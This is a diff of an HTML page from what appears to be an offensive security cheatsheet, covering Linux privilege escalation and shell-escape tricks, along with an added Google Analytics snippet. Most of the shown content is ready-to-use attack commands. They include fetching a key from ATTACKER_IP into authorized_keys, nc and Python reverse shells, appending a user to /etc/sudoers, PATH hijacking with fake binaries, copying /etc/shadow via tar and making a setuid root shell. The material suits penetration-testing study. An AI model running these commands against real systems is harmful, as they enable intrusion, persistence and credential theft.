@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2022-09-11T16:52:52 CEST">
+<meta name="revised" content="2023-02-14T12:07:00 CET">
 <title>System Tricks :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -27,7 +27,36 @@
     
       <header>
   <div class="logo">
-    <a class="baselink" href="/">Offensive Security Cheatsheet</a>
+    <head>
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+<a class="baselink" href="/">Offensive Security Cheatsheet</a>
+
   </div>
   <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
     <nav class="shortcuts">
@@ -1819,14 +1848,12 @@
     
     
     
-    
-
-<h3 id="resources">Resources</h3>
+    <h3 id="resources">Resources</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
-https://marc.info/?l<span style="color:#f92672">=</span>full-disclosure<span style="color:#111">&amp;</span><span style="color:#111">m</span><span style="color:#f92672">=</span><span style="color:#ae81ff">128776663124692</span><span style="color:#111">&amp;</span><span style="color:#111">w</span><span style="color:#f92672">=</span><span style="color:#ae81ff">2</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Search for a binary privesc</span>
-python3 gtfo -b systemctl</code></pre></div>
-<p><br/></p>
-
+https://marc.info/?l<span style="color:#f92672">=</span>full-disclosure<span style="color:#111">&amp;</span><span style="color:#111">m</span><span style="color:#f92672">=</span>128776663124692<span style="color:#111">&amp;</span><span style="color:#111">w</span><span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Search for a binary privesc</span>
+python3 gtfo -b systemctl
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="recon-and-enumeration">Recon and Enumeration</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Look for strange process</span>
 ps aux
@@ -1837,7 +1864,7 @@ find / -perm -4000
 perl -e ‘<span style="color:#111">$ENV</span><span style="color:#f92672">{</span>PATH<span style="color:#f92672">}=</span><span style="color:#d88200">&#34;/usr/bin&#34;</span><span style="color:#111">;</span>system<span style="color:#f92672">(</span><span style="color:#d88200">&#34;whoami&#34;</span><span style="color:#f92672">)</span><span style="color:#111">;</span>’ → root
 
 <span style="color:#75715e"># List processes running as root, permissions and NFS exports</span>
-<span style="color:#111">echo</span> <span style="color:#d88200">&#39;services running as root&#39;</span><span style="color:#111">;</span> ps aux <span style="color:#111">|</span> grep root<span style="color:#111">;</span>  <span style="color:#111">echo</span> <span style="color:#d88200">&#39;permissions&#39;</span><span style="color:#111">;</span> ps aux <span style="color:#111">|</span> awk <span style="color:#d88200">&#39;{print $11}&#39;</span><span style="color:#111">|</span>xargs -r ls -la <span style="color:#ae81ff">2</span>&gt;/dev/null <span style="color:#111">|</span>awk <span style="color:#d88200">&#39;!x[$0]++&#39;</span><span style="color:#111">;</span> <span style="color:#111">echo</span> <span style="color:#d88200">&#39;nfs info&#39;</span><span style="color:#111">;</span> ls -la /etc/exports <span style="color:#ae81ff">2</span>&gt;/dev/null<span style="color:#111">;</span> cat /etc/exports <span style="color:#ae81ff">2</span>&gt;/dev/null
+<span style="color:#111">echo</span> <span style="color:#d88200">&#39;services running as root&#39;</span><span style="color:#111">;</span> ps aux <span style="color:#111">|</span> grep root<span style="color:#111">;</span>  <span style="color:#111">echo</span> <span style="color:#d88200">&#39;permissions&#39;</span><span style="color:#111">;</span> ps aux <span style="color:#111">|</span> awk <span style="color:#d88200">&#39;{print $11}&#39;</span><span style="color:#111">|</span>xargs -r ls -la 2&gt;/dev/null <span style="color:#111">|</span>awk <span style="color:#d88200">&#39;!x[$0]++&#39;</span><span style="color:#111">;</span> <span style="color:#111">echo</span> <span style="color:#d88200">&#39;nfs info&#39;</span><span style="color:#111">;</span> ls -la /etc/exports 2&gt;/dev/null<span style="color:#111">;</span> cat /etc/exports 2&gt;/dev/null
 
 <span style="color:#75715e"># Get a TTY shell after a reverse shell connection</span>
 python -c <span style="color:#d88200">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
@@ -1845,27 +1872,25 @@ python -c <span style="color:#d88200">&#39;import pty;pty.spawn(&#34;/bin/bash&#
 <span style="color:#75715e"># Set PATH TERM and SHELL if they&#39;re missing</span>
 <span style="color:#111">export</span> <span style="color:#111">PATH</span><span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 <span style="color:#111">export</span> <span style="color:#111">TERM</span><span style="color:#f92672">=</span>xterm
-<span style="color:#111">export</span> <span style="color:#111">SHELL</span><span style="color:#f92672">=</span>bash</code></pre></div>
-<p><br/></p>
-
+<span style="color:#111">export</span> <span style="color:#111">SHELL</span><span style="color:#f92672">=</span>bash
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="tricks">Tricks</h3>
-
-<h4 id="public-keys-ssh">Public Keys / SSH</h4>
+<h4 id="public-keys--ssh">Public Keys / SSH</h4>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Add public key to authorized keys</span>
 <span style="color:#111">echo</span> <span style="color:#00a8c8">$(</span>wget https://ATTACKER_IP/.ssh/id_rsa.pub<span style="color:#00a8c8">)</span> &gt;&gt; ~/.ssh/authorized_keys
 
 <span style="color:#75715e"># if RSA key is added for 127.0.0.1 you can switch users</span>
-ssh -i id_rsa root@127.0.0.1</code></pre></div>
-<h4 id="python-sudoers">Python sudoers</h4>
+ssh -i id_rsa root@127.0.0.1
+</code></pre></div><h4 id="python-sudoers">Python sudoers</h4>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Add an user to sudoers in python</span>
-<span style="color:#75715e">#!/usr/bin/env python
-</span><span style="color:#75715e"></span>import os
+<span style="color:#75715e">#!/usr/bin/env python</span>
+import os
 import sys
 try:
         os.system<span style="color:#f92672">(</span><span style="color:#d88200">&#39;echo &#34;username ALL=(ALL:ALL) ALL&#34; &gt;&gt; /etc/sudoers&#39;</span><span style="color:#f92672">)</span>
 except:
-        sys.exit<span style="color:#f92672">()</span></code></pre></div>
-<h4 id="ssh-update-motd">SSH update-motd</h4>
+        sys.exit<span style="color:#f92672">()</span>
+</code></pre></div><h4 id="ssh-update-motd">SSH update-motd</h4>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># When you login from SSH, welcome message etc are executed from /etc/update-motd.d</span>
 <span style="color:#75715e"># Even if you connect in user, scripts are executed with root privileges</span>
 
@@ -1873,11 +1898,11 @@ except:
 <span style="color:#75715e"># By redifining &#34;date&#34; or &#34;uname&#34; for example</span>
 
 <span style="color:#75715e"># Example, if you can write to /usr/local/bin you can create a backdoored binary here</span>
-<span style="color:#75715e"># If the folder is first in the PATH, the backdoored one will be executed first.</span></code></pre></div>
-<h4 id="escaping-shells">Escaping Shells</h4>
+<span style="color:#75715e"># If the folder is first in the PATH, the backdoored one will be executed first.</span>
+</code></pre></div><h4 id="escaping-shells">Escaping Shells</h4>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Escaping lshell</span>
-<span style="color:#111">echo</span> FREEDOM! <span style="color:#f92672">&amp;&amp;</span> <span style="color:#111">cd</span> <span style="color:#f92672">()</span> bash <span style="color:#f92672">&amp;&amp;</span> cd</code></pre></div>
-<h4 id="path-variable">Path variable</h4>
+<span style="color:#111">echo</span> FREEDOM! <span style="color:#f92672">&amp;&amp;</span> <span style="color:#111">cd</span> <span style="color:#f92672">()</span> bash <span style="color:#f92672">&amp;&amp;</span> <span style="color:#111">cd</span>
+</code></pre></div><h4 id="path-variable">Path variable</h4>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Create fake cat</span>
 <span style="color:#111">echo</span> <span style="color:#d88200">&#34;/bin/bash&#34;</span> &gt; /tmp/cat
 chmod <span style="color:#ae81ff">777</span> /tmp/cat
@@ -1889,26 +1914,27 @@ chmod <span style="color:#ae81ff">777</span> /tmp/cat
 
 <span style="color:#75715e"># Go to root</span>
 <span style="color:#111">cd</span> /root
-/usr/sbin/cat .flag.txt</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># listinfo through date binary</span>
+/usr/sbin/cat .flag.txt
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># listinfo through date binary</span>
 <span style="color:#111">cd</span> /tmp
 <span style="color:#111">echo</span> <span style="color:#d88200">&#34;/bin/sh&#34;</span> &gt; date
 chmod <span style="color:#ae81ff">777</span> date
 <span style="color:#111">echo</span> <span style="color:#111">$PATH</span>
 <span style="color:#111">export</span> <span style="color:#111">PATH</span><span style="color:#f92672">=</span>/tmp:<span style="color:#111">$PATH</span>
-/usr/bin/listinfo</code></pre></div>
-<h4 id="chrootkit">Chrootkit</h4>
+/usr/bin/listinfo
+</code></pre></div><h4 id="chrootkit">Chrootkit</h4>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Chrootkit</span>
 chrootkit -V
-<span style="color:#75715e"># Then Google / MSF</span></code></pre></div>
-<h4 id="capabilities">Capabilities</h4>
+<span style="color:#75715e"># Then Google / MSF</span>
+</code></pre></div><h4 id="capabilities">Capabilities</h4>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Capabilities</span>
 <span style="color:#111">export</span> <span style="color:#111">PATH</span><span style="color:#f92672">=</span>/bin:/sbin:/usr/bin:/usr/sbin:<span style="color:#111">$PATH</span>
-getcap -r / <span style="color:#ae81ff">2</span>&gt;/dev/null
+getcap -r / 2&gt;/dev/null
 <span style="color:#75715e"># TAR can read all files, so you can create a tar with a wanted file and than extract it</span>
 tar -cvf shadow.tar <span style="color:#d88200">&#34;/etc/shadow&#34;</span>
 tar -xvf shadow.tar
-cat etc/shadow</code></pre></div>
-<h4 id="overcome-limited-shells">Overcome limited shells</h4>
+cat etc/shadow
+</code></pre></div><h4 id="overcome-limited-shells">Overcome limited shells</h4>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Some payloads to overcome limited shells</span>
 ssh user@<span style="color:#111">$ip</span> nc <span style="color:#111">$localip</span> <span style="color:#ae81ff">4444</span> -e /bin/sh
 python -c <span style="color:#d88200">&#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
@@ -1924,9 +1950,11 @@ python -c <span style="color:#d88200">&#39;import socket,subprocess,os;s=socket.
 <span style="color:#111">exec</span> <span style="color:#d88200">&#34;/bin/sh&#34;</span><span style="color:#111">;</span>
 
 <span style="color:#75715e"># Perl</span>
-perl —e <span style="color:#d88200">&#39;exec &#34;/bin/sh&#34;;&#39;</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># /bin/dash is the only shell to keep the sticky bit, so if you run as root (included cron, or services running as root):</span> 
+perl —e <span style="color:#d88200">&#39;exec &#34;/bin/sh&#34;;&#39;</span>
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># /bin/dash is the only shell to keep the sticky bit, so if you run as root (included cron, or services running as root): </span>
 install -mode <span style="color:#ae81ff">4755</span> /bin/dash /tmp/sh
-<span style="color:#75715e"># Then you will have a /tmp/sh that gives any user who calls it root !</span></code></pre></div>
+<span style="color:#75715e"># Then you will have a /tmp/sh that gives any user who calls it root !</span>
+</code></pre></div>
 
     
     
